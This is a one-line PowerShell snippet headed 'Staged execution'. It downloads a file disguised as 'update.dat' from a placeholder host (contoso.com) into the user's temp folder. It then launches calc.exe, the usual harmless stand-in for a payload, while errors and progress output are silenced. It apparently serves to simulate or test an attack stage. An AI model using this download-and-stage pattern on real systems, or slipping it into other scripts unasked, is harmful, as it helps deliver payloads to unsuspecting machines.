
<# Staged execution #> $PayloadUrl = 'http://contoso.com/update.dat'; $OutputPath = "$env:TEMP\update.dat"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $OutputPath); Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
